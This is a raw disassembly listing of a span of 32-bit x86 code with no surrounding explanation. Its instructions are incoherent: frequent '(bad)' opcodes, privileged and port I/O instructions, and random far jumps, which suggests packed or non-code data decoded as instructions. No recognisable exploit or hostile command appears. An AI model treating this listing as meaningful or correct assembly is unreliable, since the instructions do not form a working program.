  415f36:	addr16 enter 0x8e9b,0xe1
  415f3b:	dec    edi
  415f3c:	inc    esi
  415f3d:	out    0x41,eax
  415f3f:	mov    al,0xf1
  415f41:	mov    ebx,0xcb9459b2
  415f46:	cmp    cl,BYTE PTR [ecx+ebp*1]
  415f49:	jmp    eax
  415f4b:	sub    al,0xd2
  415f4d:	xchg   edx,eax
  415f4e:	in     al,0x1c
  415f50:	sub    al,BYTE PTR ds:0x5a01a198
  415f56:	out    0x7d,al
  415f58:	cwde   
  415f59:	cmp    DWORD PTR [ecx+0x124c3f22],ecx
  415f5f:	sbb    ah,bh
  415f61:	cmp    ah,0x27
  415f64:	shl    cl,1
  415f66:	std    
  415f67:	in     al,dx
  415f68:	jge    0x415fd2
  415f6a:	adc    bh,BYTE PTR [ebx+0x3b164ab6]
  415f70:	add    ch,BYTE PTR [ecx+0x43]
  415f73:	jo     0x415f38
  415f75:	div    ecx
  415f77:	sub    DWORD PTR [ecx+0x59d1ea05],ebx
  415f7d:	mov    dh,0x12
  415f7f:	sbb    al,0x99
  415f81:	(bad)  
  415f82:	cdq    
  415f83:	cvtdq2ps xmm7,XMMWORD PTR [ebx]
  415f86:	xor    eax,0x4faad670
  415f8b:	ja     0x415f1b
  415f8d:	popf   
  415f8e:	xor    eax,0x887ba7c2
  415f93:	cmp    eax,0x8d66c608
  415f98:	and    BYTE PTR [ecx+edi*4-0x79a16e66],ch
  415f9f:	add    ch,0xc2
  415fa2:	jmp    0x228a1969
  415fa7:	jnp    0x415f3e
  415fa9:	adc    al,0x72
  415fab:	popf   
  415fac:	pushf  
  415fad:	cdq    
  415fae:	iret   
  415faf:	test   BYTE PTR [esi-0x78],dl
  415fb2:	inc    eax
  415fb3:	mov    dh,0xe8
  415fb5:	jns    0x415f5a
  415fb7:	cmp    ecx,DWORD PTR [eax+0x4e]
  415fba:	pop    esi
  415fbb:	inc    ebx
  415fbc:	lods   al,BYTE PTR ds:[esi]
  415fbd:	adc    ah,BYTE PTR [eax+0x62]
  415fc0:	repz rol DWORD PTR [ecx-0x743c29c8],1
  415fc7:	jg     0x416042
  415fc9:	push   ebp
  415fca:	mov    ebp,0x89aa5c26
  415fcf:	xor    ecx,DWORD PTR [ebp+0x46]
  415fd2:	xchg   ecx,eax
  415fd3:	jns    0x415f57
  415fd5:	scas   al,BYTE PTR es:[di]
  415fd7:	fisubr WORD PTR [edx-0x5b4d875]
  415fdd:	mov    BYTE PTR [edx+0x24],bl
  415fe0:	push   cs
  415fe1:	mov    edi,0x9b9aaaff
  415fe6:	jne    0x416006
  415fe8:	shr    DWORD PTR [esi+edi*1],0x7b
  415fec:	sub    al,BYTE PTR [eax]
	...
  416056:	pop    ss
  416057:	mov    BYTE PTR [esi-0x6e],ch
  41605a:	push   esi
  41605c:	dec    DWORD PTR [ebp-0x37ca37e8]
  416062:	xchg   esi,eax
  416063:	adc    al,0xa
  416065:	pop    eax
  416066:	push   ecx
  416067:	in     eax,dx
  416068:	add    BYTE PTR [eax],al
  41606a:	inc    DWORD PTR [eax]
  41606c:	add    BYTE PTR [eax],al
  41606e:	xor    al,0x8d
  416070:	mov    bl,0x89
  416072:	mov    eax,0xda51d124
  416077:	mov    esp,0x2ab59bbd
  41607c:	rcr    DWORD PTR [edi+edi*4-0x2e],cl
  416080:	or     edi,DWORD PTR [esi-0x2b]
  416083:	add    BYTE PTR [ebx],ch
  416085:	jae    0x416043
  416087:	pop    ecx
  416088:	xchg   ecx,eax
  416089:	gs xor al,dh
  41608c:	push   ebp
  41608d:	in     eax,dx
  41608e:	sub    eax,esp
  416090:	and    eax,edi
  416092:	push   esp
  416093:	enter  0x9dcd,0x6e
  416097:	push   esp
  416098:	(bad)  
  416099:	wrmsr  
  41609b:	rcr    DWORD PTR [ebx-0x18],0xc7
  41609f:	not    BYTE PTR [edx+ecx*1-0x65f1d9b4]
  4160a6:	xchg   edi,esi
  4160a8:	inc    eax
  4160a9:	sti    
  4160aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160ab:	outs   dx,BYTE PTR ds:[esi]
  4160ac:	xor    BYTE PTR [eax+edx*4],bl
  4160af:	jne    0x41611a
  4160b1:	and    bl,bh
  4160b3:	mov    al,0x37
  4160b5:	dec    eax
  4160b6:	dec    esp
  4160b7:	lods   al,BYTE PTR ds:[esi]
  4160b8:	dec    sp
  4160ba:	lods   al,BYTE PTR ds:[esi]
  4160bb:	push   eax
  4160bc:	aas    
  4160bd:	adc    al,0xe1
  4160bf:	dec    esi
  4160c0:	pushf  
  4160c1:	mov    WORD PTR [edx+0x2124c6c5],ss
  4160c7:	adc    ecx,ebp
  4160c9:	enter  0xcf47,0x12
  4160cd:	jmp    0x2061:0x6bad3df6
  4160d4:	ret    
  4160d5:	dec    edx
  4160d6:	push   edx
  4160d7:	popa   
  4160d8:	push   ecx
  4160d9:	outs   dx,DWORD PTR ds:[esi]
  4160da:	add    dh,BYTE PTR [edx]
  4160dc:	aad    0xfe
  4160de:	les    edi,FWORD PTR [esi-0x7e]
  4160e1:	sub    BYTE PTR [ebx+edx*2],ah
  4160e4:	push   esi
  4160e5:	std    
  4160e6:	push   ss
  4160e7:	pop    esp
  4160e8:	add    BYTE PTR [edx-0x29],bl
  4160eb:	xor    DWORD PTR ds:0xb388e230,edi
  4160f1:	push   ebx
  4160f2:	xchg   esp,eax
  4160f3:	fld    TBYTE PTR [edi]
  4160f5:	mov    dl,BYTE PTR [edx+0x68]
  4160f8:	sti    
  4160f9:	mov    al,ds:0x9d28d9e9
  4160fe:	loope  0x4160fb
  416100:	(bad)  
  416101:	(bad)  
  416102:	jmp    0x30459987
  416107:	popf   
  416108:	pop    esp
  416109:	or     DWORD PTR [edi-0x291cb4f9],ebx
  41610f:	rcl    BYTE PTR [edi-0x6e6c0b99],0x37
  416116:	adc    eax,0x65fc44da
  41611b:	mov    al,BYTE PTR ds:0x475f8807
  416121:	push   ecx
  416122:	sub    al,0xec
  416124:	js     0x416157
  416126:	repnz lock popf 
  416129:	xor    DWORD PTR [edx+0x196ab7c7],edi
  41612f:	jae    0x41611a
  416131:	jb     0x41619e
  416133:	cmp    BYTE PTR [edi-0x67],0xe9
  416137:	mov    ecx,DWORD PTR [ecx-0x14928ae2]
  41613d:	jl     0x41612d
  41613f:	nop
  416140:	aam    0xf6
  416142:	sub    DWORD PTR [ecx+0x235e7f87],ecx
  416148:	retf   
  416149:	push   ebx
  41614a:	adc    ah,BYTE PTR [esi]
  41614c:	inc    edi
  41614d:	jmp    0x5733:0x80c68cd7
  416154:	push   0xffffff92
  416156:	dec    esp
  416157:	adc    ecx,DWORD PTR [eax+0x71]
  41615a:	push   es
  41615b:	lods   al,BYTE PTR ds:[esi]
  41615c:	and    al,0xa0
  41615e:	mov    dh,0x34
  416160:	push   0xffffff9f
  416162:	test   BYTE PTR [eax+edx*4+0x7],al
  416166:	mov    al,0xc7
  416168:	jmp    0x41612a
  41616a:	pop    ss
  41616b:	cdq    
  41616c:	fadd   DWORD PTR [eax]
	...
  4161d6:	and    cl,ch
  4161d8:	cmp    ebx,esi
  4161da:	sti    
  4161db:	fsubrp st(5),st
  4161dd:	inc    esi
  4161df:	push   edx
  4161e0:	sub    eax,0x8456bff3
  4161e5:	push   ecx
  4161e6:	push   eax
  4161e7:	out    dx,al
  4161e8:	add    BYTE PTR [eax],al
  4161ea:	inc    DWORD PTR [eax]
  4161ec:	add    BYTE PTR [eax],al
  4161ee:	cmc    
  4161ef:	jae    0x41626b
  4161f1:	pop    edx
  4161f2:	in     eax,dx
  4161f3:	adc    al,0xa7
  4161f5:	stos   DWORD PTR es:[edi],eax
  4161f6:	and    DWORD PTR [edx],eax
  4161f8:	push   ebx
  4161f9:	rcl    BYTE PTR [edi],1
  4161fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161fc:	xchg   esp,eax
  4161fd:	test   eax,0x9f8a88b6
  416202:	mov    al,0x8e
  416204:	pop    eax
  416205:	jg     0x416205
  416207:	hlt    
  416208:	sub    BYTE PTR [edx-0x51a6ec8b],ah
  41620e:	loop   0x4161f3
  416210:	jne    0x4161d8
  416212:	push   esi
  416213:	xchg   BYTE PTR [eax-0x31acb541],dl
  416219:	pusha  
  41621a:	mov    ecx,0x31b583ae
  41621f:	jg     0x41622e
  416221:	mov    bh,0xe7
  416223:	fs stos DWORD PTR es:[edi],eax
  416225:	push   0xf82715d0
  41622a:	pop    es
  41622b:	ret    
  41622c:	cmp    edi,DWORD PTR [eax+0x58]
  41622f:	or     DWORD PTR [ebx+0x21],edx
  416232:	sub    ebp,DWORD PTR [ebx]
  416234:	fld    QWORD PTR [edi+0x6b428775]
  41623a:	sub    dh,BYTE PTR [edi+0x4f]
  41623d:	mov    edx,0xa0bbaeef
  416242:	jo     0x4162a0
  416244:	dec    esp
  416245:	xor    eax,0xb584345c
  41624a:	(bad)  
  41624b:	imul   edi,DWORD PTR [ecx+0x13edad75],0x82878eaf
  416255:	sti    
  416256:	jmp    0x21e30cc6
  41625b:	sub    al,0x65
  41625d:	(bad)  
  41625e:	xchg   ebx,eax
  41625f:	push   es
  416260:	mov    ?,edi
  416262:	lds    edi,FWORD PTR [eax-0x40]
  416265:	(bad)  
  416266:	data16 jne 0x4162ca
  416269:	mov    ecx,0x470b11ec
  41626e:	cdq    
  41626f:	push   edx
  416270:	pop    ecx
  416271:	jb     0x41627b
  416273:	cdq    
  416274:	mov    edi,0xc69b1dc4
  416279:	imul   esi,esi,0xffffff97
  41627c:	cmp    DWORD PTR [bx+di+0x4f],ecx
  416280:	ins    DWORD PTR es:[edi],dx
  416281:	lahf   
  416282:	neg    bl
  416284:	mov    edx,0xfe3b559a
  416289:	cmp    ah,BYTE PTR [ecx+0x368faa30]
  41628f:	test   DWORD PTR [edi+0x23f9a024],ebx
  416295:	(bad)  
  416296:	mov    BYTE PTR [bx+di+0x7e90],cl
  41629b:	fimul  DWORD PTR [eax-0x45]
  41629e:	dec    esp
  41629f:	xchg   esp,eax
  4162a0:	je     0x4162e2
  4162a2:	sahf   
  4162a3:	jmp    0xc1757055
  4162a8:	pop    ds
  4162a9:	(bad)  
  4162aa:	add    dh,0x15
  4162ad:	push   eax
  4162ae:	mov    bh,0x34
  4162b0:	push   0x31
  4162b2:	mov    esp,0x26ceb553
  4162b7:	leave  
  4162b8:	aaa    
  4162b9:	inc    esp
  4162ba:	popa   
  4162bb:	(bad)  
  4162bd:	cwde   
  4162be:	pop    ebx
  4162bf:	std    
  4162c0:	std    
  4162c1:	pop    ecx
  4162c2:	or     dl,BYTE PTR [ebp+0x1d]
  4162c5:	mov    WORD PTR [ebp-0xe],ds
  4162c8:	inc    eax
  4162c9:	sbb    DWORD PTR [ecx],eax
  4162cb:	push   ss
  4162cc:	pop    ecx
  4162cd:	lahf   
  4162ce:	jno    0x416309
  4162d0:	jns    0x4162cc
  4162d2:	outs   dx,BYTE PTR ds:[esi]
  4162d3:	push   esp
  4162d4:	arpl   bp,sp
  4162d6:	jge    0x4162d6
  4162d8:	pusha  
  4162d9:	lods   al,BYTE PTR ds:[esi]
  4162da:	mov    cl,dl
  4162dc:	outs   dx,DWORD PTR ds:[esi]
  4162dd:	lahf   
  4162de:	jae    0x41632a
  4162e0:	xchg   esp,eax
  4162e1:	fisttp QWORD PTR [ecx-0x26]
  4162e4:	test   al,0xc6
  4162e6:	mov    edx,0x44ed5175
  4162eb:	jle    0x416296
	...
  416355:	add    BYTE PTR [ebx],ah
  416357:	outs   dx,BYTE PTR ds:[esi]
  416358:	xor    ah,BYTE PTR ds:0x6e377d7f
  41635e:	mov    bl,0x5f
  416360:	call   0x4f56:0x2ea0b2ee
  416367:	out    dx,eax
  416368:	add    BYTE PTR [eax],al
  41636a:	inc    DWORD PTR [eax]
  41636c:	add    BYTE PTR [eax],al
  41636e:	pop    ds
  41636f:	div    BYTE PTR [edx+0x53f3815]
  416375:	jl     0x416344
  416377:	cmp    BYTE PTR [esi-0x5faae2cf],0xae
  41637e:	das    
  41637f:	mov    bl,0x8e
  416381:	hlt    
  416382:	mov    esp,0x44be8e6d
  416387:	sub    dh,cl
  416389:	push   cs
  41638a:	loopne 0x4163e7
  41638c:	jae    0x416360
  41638e:	js     0x41633f
  416390:	call   0xcec8:0xace04cab
  416397:	mov    edx,0x7333ddc
  41639c:	call   0x644fbbde
  4163a1:	push   ebp
  4163a2:	in     eax,dx
  4163a3:	int    0x52
  4163a5:	jecxz  0x41633c
  4163a7:	mov    edx,ebx
  4163a9:	stos   BYTE PTR es:[edi],al
  4163aa:	mov    ecx,DWORD PTR [eax-0x3a0efe9f]
  4163b0:	lds    ebp,FWORD PTR [bp+di]
  4163b3:	jg     0x4163ff
  4163b5:	jne    0x4163d2
  4163b7:	push   ebp
  4163b8:	fldcw  WORD PTR [eax+ecx*2-0x53ff7b82]
  4163bf:	(bad)
  4163c3:	pushf  
  4163c4:	jmp    0x4163df
  4163c6:	ins    DWORD PTR es:[edi],dx
  4163c7:	into   
  4163c8:	sub    BYTE PTR [edi+0x25],dl
  4163cb:	lds    edx,FWORD PTR [edi]
  4163cd:	and    esi,ebx
  4163cf:	in     eax,0xe7
  4163d1:	scas   eax,DWORD PTR es:[edi]
  4163d2:	mov    eax,ds:0xf69d711c
  4163d7:	mov    ds:0xb489ea84,eax
  4163dc:	cwde   
  4163dd:	ins    DWORD PTR es:[edi],dx
  4163de:	in     eax,dx
  4163df:	shr    DWORD PTR [esi-0x4c],1
  4163e2:	ins    DWORD PTR es:[edi],dx
  4163e3:	ins    DWORD PTR es:[edi],dx
  4163e4:	(bad)  
  4163e6:	fild   QWORD PTR [edi+0x4f]
  4163e9:	xchg   ebp,eax
  4163ea:	xchg   ebx,eax
  4163eb:	sbb    ecx,DWORD PTR [ebp+0x24]
  4163ee:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4163f0:	sbb    al,0x9c
  4163f2:	push   0x5ef7041
  4163f7:	leave  
  4163f8:	xlat   BYTE PTR ds:[ebx]
  4163f9:	mov    bh,0x67
  4163fb:	dec    edi
  4163fc:	mov    al,ds:0x78bef522
  416401:	xor    al,dh
  416403:	push   esp
  416404:	stos   BYTE PTR es:[edi],al
  416405:	and    ch,BYTE PTR [ebx]
  416407:	dec    BYTE PTR [edx]
  416409:	cmp    esi,DWORD PTR [eax+0x2b]
  41640c:	pushf  
  41640d:	les    ebp,FWORD PTR [ebp+0x65]
  416410:	cmp    al,0xb3
  416412:	mov    al,ds:0x1c9f501
  416417:	adc    al,0x59
  416419:	mov    edx,0x24e2ab74
  41641e:	sub    al,0x52
  416420:	or     DWORD PTR [esi],ebx
  416422:	mov    ax,0x5844
  416426:	add    dh,BYTE PTR [ebx-0x3d]
  416429:	dec    eax
  41642a:	mov    bl,0xe2
  41642c:	leave  
  41642d:	dec    ecx
  41642e:	push   0xb79160dc
  416433:	gs pop edi
  416435:	nop
  416436:	loope  0x4164a7
  416438:	mov    ds:0xe0fd94c5,eax
  41643d:	jmp    0xc679:0xf6c700d5
  416444:	cmp    BYTE PTR [ecx-0x36],bl
  416447:	ret    0x2fbf
  41644a:	xor    ch,BYTE PTR [edx]
  41644c:	mov    BYTE PTR [ebx],0x14
  41644f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416450:	sbb    DWORD PTR [esi],eax
  416452:	into   
  416453:	psubb  mm4,QWORD PTR [eax+0x57cb50a6]
  41645a:	out    dx,al
  41645b:	mov    al,ds:0x6398174b
  416460:	rcr    cl,1
  416462:	lea    edx,[edx]
  416464:	xchg   esp,eax
  416465:	call   0x32e1:0x7f405377
  41646c:	out    dx,eax
	...
  4164d5:	add    bl,dh
  4164d7:	inc    ebx
  4164d8:	ror    cl,1
  4164da:	lock (bad) 
  4164dd:	jnp    0x41646d
  4164df:	xor    al,0x5a
  4164e1:	xchg   esi,eax
  4164e2:	mov    ah,0x37
  4164e4:	and    ah,dl
  4164e6:	dec    esi
  4164e7:	lock add BYTE PTR [eax],al
  4164ea:	inc    DWORD PTR [eax]
  4164ec:	add    BYTE PTR [eax],al
  4164ee:	fdivr  DWORD PTR [eax+0x6a]
  4164f1:	repnz ds stos DWORD PTR es:[edi],eax
  4164f4:	arpl   WORD PTR [edx-0x2f],sp
  4164f7:	cmp    edi,DWORD PTR [eax]
  4164f9:	mov    bh,0x25
  4164fb:	mov    esp,0xa2824f7b
  416500:	inc    ebx
  416501:	inc    edi
  416502:	fisttp DWORD PTR [ebx-0x61]
  416505:	out    0xa,eax
  416507:	sbb    BYTE PTR [edx+0x1c],ch
  41650a:	jmp    0xed2a:0x82147b18
  416511:	push   esp
  416512:	leave  
  416513:	adc    eax,0x590ca31a
  416518:	mov    bl,0x9e
  41651a:	pop    esp
  41651b:	add    BYTE PTR [edi],dl
  41651d:	jmp    0xca72fca0
  416522:	mov    eax,0x2bfbf498
  416527:	xchg   ecx,eax
  416528:	lds    eax,FWORD PTR [edi+0x42cb47c7]
  41652e:	cmp    al,0x49
  416530:	adc    al,0x45
  416532:	in     al,0x29
  416534:	dec    eax
  416535:	pop    edx
  416536:	popf   
  416537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416538:	ja     0x416565
  41653a:	arpl   bx,ax
  41653c:	shl    DWORD PTR [ebx],0x69
  41653f:	in     eax,0x63
  416541:	push   cs
  416542:	cmp    DWORD PTR [ebp+0x42],esi
  416545:	inc    esi
  416546:	and    DWORD PTR [ecx+ebx*4],esp
  416549:	push   eax
  41654a:	and    edx,DWORD PTR [eax-0x52]
  41654d:	add    eax,0x59a975fa
  416552:	mov    al,0xcc
  416554:	xchg   edx,eax
  416555:	shl    BYTE PTR [ecx+0x5d],cl
  416558:	and    DWORD PTR [edx+0x55],edx
  41655b:	dec    ebx
  41655c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41655d:	icebp  
  41655e:	repz xchg esi,eax
  416560:	pop    ecx
  416561:	jl     0x41654a
  416563:	(bad)  
  416564:	call   0xfa59:0x89256535
  41656b:	clc    
  41656c:	xor    edi,esp
  41656e:	mov    dh,0xc5
  416570:	jle    0x416523
  416572:	inc    edx
  416573:	pop    edi
  416574:	out    0xa0,eax
  416576:	in     al,dx
  416577:	fsubr  st(5),st
  416579:	repz jb 0x41651b
  41657c:	pinsrw mm7,WORD PTR [eax],0x86
  416580:	pop    ds
  416581:	ins    BYTE PTR es:[edi],dx
  416582:	fs push ebp
  416584:	(bad)  
  416585:	jne    0x416583
  416587:	jmp    0xe69bc93d
  41658c:	pop    ecx
  41658d:	fistp  WORD PTR [edx]
  41658f:	bound  ebp,QWORD PTR [ebx-0x64b41440]
  416595:	push   esi
  416596:	jb     0x4165fd
  416598:	into   
  416599:	lods   eax,DWORD PTR ds:[esi]
  41659a:	pop    ecx
  41659b:	fiadd  DWORD PTR [eax-0xd]
  41659e:	pop    ss
  41659f:	or     al,0x51
  4165a1:	imul   eax,ebx,0xd7030388
  4165a7:	sbb    DWORD PTR [edx],ebp
  4165a9:	in     al,0x36
  4165ab:	cli    
  4165ac:	push   edx
  4165ad:	cmp    al,BYTE PTR [ecx+eiz*2]
  4165b0:	jnp    0x4165d0
  4165b2:	mov    esi,0x9dfe2aff
  4165b7:	les    esp,FWORD PTR [eax]
  4165b9:	loopne 0x4165c6
  4165bb:	stos   BYTE PTR es:[edi],al
  4165bc:	inc    eax
  4165bd:	push   0x8ada1119
  4165c2:	push   0xffffffec
  4165c4:	xchg   ebp,eax
  4165c5:	pop    eax
  4165c6:	lds    edx,FWORD PTR [ebx-0x1e]
  4165c9:	repnz shr BYTE PTR [ebx-0x55],1
  4165cd:	mov    al,0xc0
  4165cf:	or     ebx,esp
  4165d1:	xor    bl,BYTE PTR [eax+0x61f5642b]
  4165d7:	paddusb mm5,QWORD PTR ds:0xff8a7786
  4165de:	xchg   BYTE PTR [ecx+0x7e],cl
  4165e1:	imul   esi,esp,0xc4b50eca
  4165e7:	cmp    BYTE PTR [esp+ecx*1],cl
  4165ea:	repnz pop edi
  4165ec:	sahf   
	...
  416655:	add    BYTE PTR ds:0xfff32bd8,ah
  41665b:	repz std 
  41665d:	fisub  WORD PTR [esi+0x154fbcac]
  416663:	inc    ecx
  416664:	jle    0x416658
  416666:	dec    ebp
  416667:	icebp  
  416668:	add    BYTE PTR [eax],al
  41666a:	inc    DWORD PTR [eax]
  41666c:	add    BYTE PTR [eax],al
  41666e:	cmp    DWORD PTR [esp+esi*2+0x50],0x66
  416673:	mov    WORD PTR [ecx+0x6d],?
  416676:	lock sub dl,BYTE PTR [edi-0x6a]
  41667a:	repz inc esi
  41667c:	sub    BYTE PTR [esi-0x52],al
  41667f:	and    esi,DWORD PTR [ebp+0x3f]
  416682:	mov    bl,0xc7
  416684:	cs daa 
  416686:	jmp    0x2139a422
  41668b:	push   0xffffffe4
  41668d:	push   0xe7bec253
  416692:	outs   dx,DWORD PTR ds:[esi]
  416693:	dec    ebp
  416694:	js     0x416642
  416696:	cmp    al,0xf3
  416698:	sub    ch,BYTE PTR [ebp+0x2a]
  41669b:	mov    ah,0x29
  41669d:	sub    esp,DWORD PTR [ebx+0xd]
  4166a0:	das    
  4166a1:	daa    
  4166a2:	cmp    esp,ebp
  4166a4:	dec    eax
  4166a5:	rcr    BYTE PTR [eiz*2-0x4372b07c],cl
  4166ac:	adc    dh,cl
  4166ae:	repz inc esp
  4166b0:	pushf  
  4166b1:	popa   
  4166b2:	bndstx [edi],bnd2
  4166b5:	pop    esp
  4166b6:	fwait
  4166b7:	mov    ds:0x7bb15ab0,eax
  4166bc:	xchg   edi,eax
  4166bd:	jno    0x416689
  4166bf:	cwde   
  4166c0:	push   cs
  4166c1:	lods   eax,DWORD PTR ds:[esi]
  4166c2:	inc    ecx
  4166c3:	mov    ah,0x7
  4166c5:	inc    ebx
  4166c6:	sbb    bl,BYTE PTR [ebp-0x13b4df52]
  4166cc:	pop    ebx
  4166cd:	lods   eax,DWORD PTR ds:[esi]
  4166ce:	fwait
  4166cf:	out    0x4b,eax
  4166d1:	xchg   ebx,eax
  4166d2:	pop    edi
  4166d3:	idiv   bh
  4166d5:	dec    edx
  4166d6:	std    
  4166d7:	xor    al,0xd3
  4166d9:	mov    ecx,0x3d99d017
  4166de:	mov    ebp,cr3
  4166e1:	add    DWORD PTR [esi-0x5c],eax
  4166e4:	mov    ds:0x9598b14d,al
  4166e9:	mov    eax,ds:0x31d2fc78
  4166ee:	mov    DWORD PTR [ecx],esi
  4166f0:	outs   dx,DWORD PTR ds:[esi]
  4166f1:	pop    ds
  4166f2:	adc    eax,esi
  4166f4:	mov    ah,0x6d
  4166f6:	aam    0x56
  4166f8:	jl     0x416765
  4166fa:	xor    eax,0x81dc078f
  4166ff:	jo     0x416762
  416701:	pop    esi
  416702:	jb     0x416698
  416704:	mov    bh,0x75
  416706:	cmp    BYTE PTR [ebx-0x25820f5a],0x93
  41670d:	ss xchg esp,eax
  41670f:	dec    ebx
  416710:	pop    ds
  416711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416712:	lds    ecx,FWORD PTR [ebp+0x5f5f0fe5]
  416718:	mov    dh,0xbf
  41671a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41671b:	aam    0x59
  41671d:	xchg   edx,eax
  41671e:	popa   
  41671f:	ret    0xef55
  416722:	xor    al,0x71
  416724:	add    dh,BYTE PTR [eax+0xd]
  416727:	push   cs
  416728:	ror    DWORD PTR [esp+eax*1+0xb],cl
  41672c:	sub    eax,0xce914a62
  416731:	mov    al,ds:0xb1a7425f
  416736:	xchg   ebp,eax
  416737:	mov    ebx,0xd33d149d
  41673c:	(bad)  
  41673d:	repnz lea edx,[edx-0x5418826c]
  416744:	inc    BYTE PTR [ebx+0x37a91b4e]
  41674a:	add    eax,0xa03f6d2a
  41674f:	mov    al,bl
  416751:	push   eax
  416752:	jbe    0x41679d
  416754:	xchg   ebx,eax
  416755:	sbb    DWORD PTR es:[eax],esp
  416758:	out    0x91,al
  41675a:	popa   
  41675b:	sbb    DWORD PTR [ecx+esi*1+0x5c276100],eax
  416762:	cdq    
  416763:	lahf   
  416764:	pop    ds
  416765:	xchg   edx,eax
  416766:	jae    0x416783
  416768:	fnsave [ecx+0x5e]
  41676b:	mov    ebx,0x84
	...
  4167d4:	add    BYTE PTR [eax],al
  4167d6:	(bad)  
  4167d7:	(bad)  
  4167d9:	(bad)  
  4167da:	(bad)  
  4167dc:	out    0xff,eax
  4167de:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  4167e2:	mov    dh,0x8
  4167e4:	mov    ds,ecx
  4167e6:	dec    esp
  4167e7:	repnz add BYTE PTR [eax],al
  4167ea:	inc    DWORD PTR [eax]
  4167ec:	add    BYTE PTR [eax],al
  4167ee:	ins    BYTE PTR es:[edi],dx
  4167ef:	stos   BYTE PTR es:[edi],al
  4167f0:	sbb    dh,BYTE PTR [ebp+0x28]
  4167f3:	sub    BYTE PTR [ecx],cl
  4167f5:	pop    eax
  4167f6:	retf   0x806c
  4167f9:	inc    ecx
  4167fa:	push   0x7b
  4167fc:	inc    ebx
  4167fd:	and    dl,BYTE PTR [ebp-0x7]
  416800:	adc    DWORD PTR gs:[ecx+ecx*2-0x747d2432],ecx
  416808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416809:	mov    cl,0x43
  41680b:	push   0xfb9c7d47
  416810:	test   BYTE PTR [eax],ah
  416812:	jmp    0x5f4e32bf
  416817:	sbb    edx,edi
  416819:	jb     0x41680c
  41681b:	(bad)  
  41681c:	jle    0x41682e
  41681e:	fnstenv [ebx]
  416820:	dec    ebp
  416821:	lds    eax,FWORD PTR [ecx]
  416823:	(bad)  
  416824:	xchg   ecx,eax
  416825:	mov    ebp,ecx
  416827:	call   FWORD PTR [edi+0x72]
  41682a:	rcl    ch,cl
  41682c:	outs   dx,DWORD PTR ds:[esi]
  41682d:	cmp    eax,0xb12483bb
  416832:	cmp    esp,esi
  416834:	mov    bh,0x4a
  416836:	rcr    DWORD PTR [esi-0x656905f0],cl
  41683c:	adc    eax,0xfe1cdb22
  416841:	ins    DWORD PTR es:[edi],dx
  416842:	push   edi
  416843:	mov    BYTE PTR [esi+edx*8],ah
  416846:	test   al,0xaf
  416848:	jne    0x41681d
  41684a:	cld    
  41684b:	xchg   ecx,eax
  41684c:	jecxz  0x41688f
  41684e:	fild   WORD PTR [ebp+0x70]
  416851:	push   ecx
  416852:	adc    eax,0xcac7a83d
  416857:	xor    ah,bh
  416859:	cmp    al,0x16
  41685b:	inc    ecx
  41685c:	push   esp
  41685d:	and    eax,DWORD PTR [ebx-0x713f88fa]
  416863:	mov    ch,bh
  416865:	ss jnp 0x416858
  416868:	outs   dx,DWORD PTR ds:[esi]
  416869:	xchg   ebx,eax
  41686a:	xchg   edx,eax
  41686b:	mov    eax,0x590e3a6d
  416870:	(bad)
  416874:	out    dx,eax
  416875:	mov    BYTE PTR [eax+ecx*8-0xeffaa4e],ch
  41687c:	or     al,0xbd
  41687e:	stos   BYTE PTR es:[edi],al
  41687f:	jmp    0x896bfdea
  416884:	in     al,0x32
  416886:	cwde   
  416887:	xchg   esi,eax
  416888:	jg     0x41683c
  41688a:	sbb    DWORD PTR [eax+0x44f70ee0],ebx
  416890:	dec    ebp
  416891:	out    dx,al
  416892:	push   ebx
  416893:	jno    0x416877
  416895:	sub    BYTE PTR [ecx-0x4a],0x1a
  416899:	jmp    0xf68e:0xa468bffc
  4168a0:	inc    esi
  4168a1:	mov    esp,0x1c2eeb60
  4168a6:	and    bh,BYTE PTR [edi+0x64bf316b]
  4168ac:	mov    dh,0x40
  4168ae:	dec    ecx
  4168af:	sub    DWORD PTR [eax+eax*1+0x58],eax
  4168b3:	jl     0x4168e4
  4168b5:	cmp    ah,BYTE PTR [edi+0x34]
  4168b8:	nop
  4168b9:	xchg   ecx,eax
  4168ba:	mov    cl,BYTE PTR [esi-0x6a]
  4168bd:	scas   al,BYTE PTR es:[edi]
  4168be:	adc    al,0x7
  4168c0:	fsub   DWORD PTR [ebp+eax*2+0x78]
  4168c4:	fld    TBYTE PTR [esi]
  4168c6:	cmp    DWORD PTR [esi],0x39ef09fc
  4168cc:	adc    BYTE PTR [edi+0x48],0x5e
  4168d0:	inc    eax
  4168d1:	iret   
  4168d2:	and    bl,dl
  4168d4:	scas   al,BYTE PTR es:[edi]
  4168d5:	or     al,0xe7
  4168d7:	in     eax,0xe6
  4168d9:	and    eax,0x6b4958d8
  4168de:	ds mov bl,0xdb
  4168e1:	aad    0xd4
  4168e3:	push   ebp
  4168e4:	dec    edx
  4168e5:	aad    0xd1
  4168e7:	repz sbb al,0x71
  4168ea:	test   DWORD PTR [edx+edi*4],eax
	...
  416955:	add    cl,dl
  416957:	scas   eax,DWORD PTR es:[edi]
  416958:	push   es
  416959:	repz jle 0x416957
  41695c:	cmc    
  41695d:	scas   eax,DWORD PTR es:[edi]
  41695e:	sub    DWORD PTR [edi-0x5d],edi
  416961:	mov    ebp,0x53de6d60
  416966:	dec    ebx
  416967:	repz add BYTE PTR [eax],al
  41696a:	inc    DWORD PTR [eax]
  41696c:	add    BYTE PTR [eax],al
  41696e:	adc    dh,0x9
  416971:	mov    BYTE PTR [edx],dh
  416973:	lea    ecx,[esi-0x20ee0c7f]
  416979:	cmp    ebp,DWORD PTR [edi+0x72]
  41697c:	inc    ebx
  41697d:	jo     0x4169e2
  41697f:	jb     0x416953
  416981:	adc    BYTE PTR [edi-0x7aa6068f],ch
  416987:	add    BYTE PTR [eax+0x2e],cl
  41698a:	sbb    BYTE PTR [ebx+0x47],ah
  41698d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41698e:	aam    0xb8
